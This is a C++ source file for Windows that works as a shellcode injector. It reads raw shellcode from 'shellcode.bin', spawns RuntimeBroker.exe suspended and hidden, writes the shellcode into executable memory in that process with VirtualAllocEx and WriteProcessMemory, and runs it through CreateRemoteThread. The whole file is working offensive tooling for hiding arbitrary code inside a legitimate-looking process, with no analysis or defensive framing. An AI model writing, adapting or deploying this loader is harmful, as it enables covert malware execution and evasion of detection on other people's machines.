#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>

bool InjectShellcode(const BYTE* shellcode, SIZE_T shellcodeSize) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessA(NULL, (LPSTR)"RuntimeBroker.exe", NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID execMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1); // clean
        return false;
    }

    // write shellcode in memory
    if (!WriteProcessMemory(pi.hProcess, execMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, execMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); // clean
        return false;
    }

    std::cout << "Shellcode written to memory successfully." << std::endl;


    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, execMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1); // clean
        return false;
    }
    else {
        std::cout << "Remote thread created successfully. Thread ID: " << GetThreadId(hThread) << std::endl;
    }

    // Resume principal Thread 
    ResumeThread(pi.hThread);
    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

// laod le shellcode from path 
std::vector<unsigned char> loadShellcodeFromFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return {};
    }

    std::streampos size = file.tellg();
    std::vector<unsigned char> buffer(size);

    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    file.close();

    return buffer;
}

int main() {
    std::string shellcodePath = "shellcode.bin"; // shellcode path
    auto shellcode = loadShellcodeFromFile(shellcodePath);
    if (shellcode.empty()) {
        std::cerr << "Failed to load shellcode from file." << std::endl;
        return 1;
    }

    std::cout << "Shellcode loaded successfully. Size: " << shellcode.size() << " bytes" << std::endl;
    // if successfully return to fonction "InjectShellcode"
    if (!InjectShellcode(shellcode.data(), shellcode.size())) {
        std::cerr << "Shellcode injection failed." << std::endl;
        return 1;
    }

    return 0;
}
